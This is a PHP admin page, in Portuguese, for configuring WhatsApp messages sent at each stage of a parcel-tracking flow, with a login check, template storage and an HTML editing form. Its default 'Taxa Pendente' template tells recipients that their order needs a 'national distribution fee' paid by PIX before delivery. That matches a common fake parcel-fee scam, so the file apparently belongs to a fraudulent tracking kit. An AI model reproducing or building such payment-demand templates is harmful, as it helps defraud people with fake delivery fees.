<?php
/**
 * Configurações de Mensagens WhatsApp por Etapa
 */

require_once __DIR__ . '/includes/config.php';
require_once __DIR__ . '/includes/db_connect.php';

// Verificar login
if (!isset($_SESSION['logado'])) {
    header('Location: admin.php');
    exit;
}

$message = '';
$type = '';

// Etapas disponíveis
$etapas = [
    'postado' => [
        'nome' => 'Objeto Postado',
        'icon' => '📦',
        'key' => 'WHATSAPP_MSG_POSTADO'
    ],
    'transito' => [
        'nome' => 'Em Trânsito',
        'icon' => '🚚',
        'key' => 'WHATSAPP_MSG_TRANSITO'
    ],
    'distribuicao' => [
        'nome' => 'No Centro de Distribuição',
        'icon' => '🏢',
        'key' => 'WHATSAPP_MSG_DISTRIBUICAO'
    ],
    'entrega' => [
        'nome' => 'Saiu para Entrega',
        'icon' => '🚀',
        'key' => 'WHATSAPP_MSG_ENTREGA'
    ],
    'entregue' => [
        'nome' => 'Entregue',
        'icon' => '✅',
        'key' => 'WHATSAPP_MSG_ENTREGUE'
    ],
    'taxa' => [
        'nome' => 'Taxa Pendente',
        'icon' => '💰',
        'key' => 'WHATSAPP_MSG_TAXA'
    ]
];

// Valores padrão
$defaults = [
    'postado' => "Olá {nome}!\n\n📦 *Objeto Postado*\n\nSeu pedido *{codigo}* foi postado e está em processamento.\n\n{link}",
    'transito' => "Olá {nome}!\n\n🚚 *Em Trânsito*\n\nSeu pedido *{codigo}* está a caminho do centro de distribuição.\n\n{link}",
    'distribuicao' => "Olá {nome}!\n\n🏢 *No Centro de Distribuição*\n\nSeu pedido *{codigo}* chegou ao centro de distribuição e está sendo processado.\n\n{link}",
    'entrega' => "Olá {nome}!\n\n🚀 *Saiu para Entrega*\n\nSeu pedido *{codigo}* saiu para entrega e chegará em breve!\n\n{link}",
    'entregue' => "Olá {nome}!\n\n✅ *Pedido Entregue*\n\nSeu pedido *{codigo}* foi entregue com sucesso!\n\nObrigado pela preferência! 🎉",
    'taxa' => "Olá {nome}!\n\n💰 *Taxa de Distribuição Nacional*\n\nSeu pedido *{codigo}* precisa de uma taxa de R$ {taxa_valor} para seguir para entrega.\n\nFaça o pagamento via PIX:\n`{taxa_pix}`\n\nApós o pagamento, a liberação acontece rapidamente.\n\n{link}"
];

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['salvar_mensagens'])) {
    try {
        $saved = 0;
        $errors = [];
        
        foreach ($etapas as $key => $etapa) {
            $msgKey = $etapa['key'];
            $mensagem = isset($_POST[$key]) ? trim($_POST[$key]) : '';
            
            if ($mensagem !== '') {
                if (setDynamicConfig($msgKey, $mensagem)) {
                    $saved++;
                } else {
                    $errors[] = $etapa['nome'];
                }
            }
        }
        
        // Limpar cache
        if (function_exists('opcache_reset')) {
            opcache_reset();
        }
        clearstatcache(true, __DIR__ . '/config_custom.json');
        
        if ($saved > 0) {
            $message = "✅ {$saved} mensagem(ns) salva(s) e verificada(s) com sucesso!";
            if (!empty($errors)) {
                $message .= "\n\n⚠️ Falha ao salvar: " . implode(', ', $errors);
            }
            $type = 'success';
            writeLog("Mensagens WhatsApp personalizadas atualizadas: {$saved} mensagens", 'INFO');
        } else {
            throw new Exception('Nenhuma mensagem foi salva. Verifique as permissões do arquivo config.json. Execute debug_config.php para diagnóstico.');
        }
    } catch (Exception $e) {
        $message = $e->getMessage();
        $type = 'error';
        writeLog("Erro ao salvar mensagens WhatsApp: " . $e->getMessage(), 'ERROR');
    }
}

// Carregar mensagens atuais
$mensagensAtuais = [];
foreach ($etapas as $key => $etapa) {
    $mensagensAtuais[$key] = getDynamicConfig($etapa['key'], $defaults[$key]);
}
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>Configurações - Mensagens WhatsApp</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <meta name="theme-color" content="#FF3333">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <link rel="manifest" href="manifest.webmanifest">
    <link rel="apple-touch-icon" href="assets/images/whatsapp-1.jpg">
    <meta http-equiv="Cache-Control" content="no-store" />
    <meta http-equiv="Pragma" content="no-cache" />
    <link rel="stylesheet" href="assets/css/admin-mobile.css">
    <style>
        * { box-sizing: border-box; }
        body { 
            background: #0b0b0b; 
            color: #fff; 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
            margin: 0; 
            padding: 20px; 
            line-height: 1.6;
        }
        .container { 
            max-width: 1000px; 
            margin: 0 auto; 
            background: #161616; 
            padding: 24px; 
            border-radius: 12px; 
            border: 1px solid #2a2a2a; 
        }
        h1 { 
            margin-top: 0; 
            color: #ff3333;
            display: flex;
            align-items: center;
            gap: 12px;
        }
        .topbar { 
            display: flex; 
            justify-content: space-between; 
            align-items: center; 
            margin-bottom: 24px; 
            flex-wrap: wrap;
            gap: 12px;
        }
        .topbar a { 
            background: #252525; 
            padding: 10px 16px; 
            border-radius: 8px; 
            border: 1px solid #333;
            text-decoration: none;
            color: #fff;
            transition: background 0.2s;
        }
        .topbar a:hover {
            background: #333;
        }
        .msg { 
            padding: 12px 16px; 
            border-radius: 8px; 
            margin-bottom: 20px; 
        }
        .success { 
            background: #0a2915; 
            border: 1px solid #1a6b2d; 
            color: #4ade80;
        }
        .error { 
            background: #2a1111; 
            border: 1px solid #6b1a1a; 
            color: #f87171;
        }
        .etapa-card {
            background: #1a1a1a;
            border: 1px solid #2a2a2a;
            border-radius: 8px;
            padding: 20px;
            margin-bottom: 20px;
        }
        .etapa-header {
            display: flex;
            align-items: center;
            gap: 12px;
            margin-bottom: 12px;
            font-size: 1.1rem;
            font-weight: 600;
            color: #fff;
        }
        .etapa-header .icon {
            font-size: 1.5rem;
        }
        textarea {
            width: 100%;
            min-height: 120px;
            padding: 12px;
            border-radius: 8px;
            border: 1px solid #333;
            background: #0f0f0f;
            color: #fff;
            font-family: 'Courier New', monospace;
            font-size: 0.9rem;
            resize: vertical;
        }
        textarea:focus {
            outline: none;
            border-color: #ff3333;
        }
        .vars-info {
            background: #1a1a1a;
            border: 1px solid #333;
            border-radius: 6px;
            padding: 12px;
            margin-top: 8px;
            font-size: 0.85rem;
            color: #aaa;
        }
        .vars-info strong {
            color: #ff3333;
        }
        .vars-list {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
            gap: 8px;
            margin-top: 8px;
        }
        .var-item {
            background: #0f0f0f;
            padding: 6px 10px;
            border-radius: 4px;
            font-family: monospace;
            font-size: 0.85rem;
        }
        .actions { 
            display: flex; 
            gap: 12px; 
            margin-top: 24px;
            padding-top: 24px;
            border-top: 1px solid #2a2a2a;
        }
        button { 
            padding: 12px 24px; 
            border: none; 
            border-radius: 8px; 
            cursor: pointer; 
            font-weight: 600; 
            color: #fff; 
            background: linear-gradient(90deg, #ff3333, #ff6600);
            transition: transform 0.2s, box-shadow 0.2s;
        }
        button:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(255, 51, 51, 0.3);
        }
        button:active {
            transform: translateY(0);
        }
        .info-box {
            background: #1a1a1a;
            border: 1px solid #333;
            border-radius: 8px;
            padding: 16px;
            margin-bottom: 24px;
            color: #aaa;
            font-size: 0.9rem;
        }
        .info-box strong {
            color: #fff;
        }
        @media (max-width: 768px) {
            .container {
                padding: 16px;
            }
            .topbar {
                flex-direction: column;
                align-items: flex-start;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="topbar">
            <h1>
                <span>💬</span>
                <span>Configurações — Mensagens WhatsApp</span>
            </h1>
            <a href="admin.php">⟵ Voltar ao painel</a>
        </div>

        <?php if ($message): ?>
            <div class="msg <?= $type ?>"><?= htmlspecialchars($message) ?></div>
        <?php endif; ?>

        <div class="info-box">
            <strong>💡 Dica:</strong> Use as variáveis abaixo para personalizar suas mensagens. Elas serão substituídas automaticamente pelos dados reais do pedido.
        </div>

        <form method="POST">
            <?php foreach ($etapas as $key => $etapa): ?>
                <div class="etapa-card">
                    <div class="etapa-header">
                        <span class="icon"><?= $etapa['icon'] ?></span>
                        <span><?= $etapa['nome'] ?></span>
                    </div>
                    <textarea 
                        name="<?= htmlspecialchars($key) ?>" 
                        id="msg_<?= htmlspecialchars($key) ?>"
                        placeholder="Digite a mensagem personalizada para esta etapa..."
                    ><?= htmlspecialchars($mensagensAtuais[$key]) ?></textarea>
                    <div class="vars-info">
                        <strong>Variáveis disponíveis:</strong>
                        <div class="vars-list">
                            <div class="var-item">{nome}</div>
                            <div class="var-item">{codigo}</div>
                            <div class="var-item">{status}</div>
                            <div class="var-item">{titulo}</div>
                            <div class="var-item">{descricao}</div>
                            <div class="var-item">{cidade}</div>
                            <div class="var-item">{data}</div>
                            <div class="var-item">{hora}</div>
                            <div class="var-item">{link}</div>
                            <?php if ($key === 'taxa'): ?>
                                <div class="var-item">{taxa_valor}</div>
                                <div class="var-item">{taxa_pix}</div>
                            <?php endif; ?>
                        </div>
                    </div>
                </div>
            <?php endforeach; ?>

            <div class="actions">
                <button type="submit" name="salvar_mensagens">💾 Salvar Todas as Mensagens</button>
                <a href="admin.php" style="padding: 12px 24px; display: inline-block;">Cancelar</a>
                <a href="debug_config.php" target="_blank" style="padding: 12px 24px; display: inline-block; background: #333;">🔍 Diagnóstico</a>
            </div>
        </form>
        
        <div style="margin-top: 20px; padding: 16px; background: #0a2915; border: 1px solid #1a6b2d; border-radius: 8px;">
            <p style="margin: 0; color: #4ade80; font-size: 0.9rem;">
                ✅ <strong>Suas personalizações são salvas em <code>config_custom.json</code></strong> — este arquivo NÃO é sobrescrito por atualizações do sistema!
            </p>
        </div>
    </div>
</body>
</html>

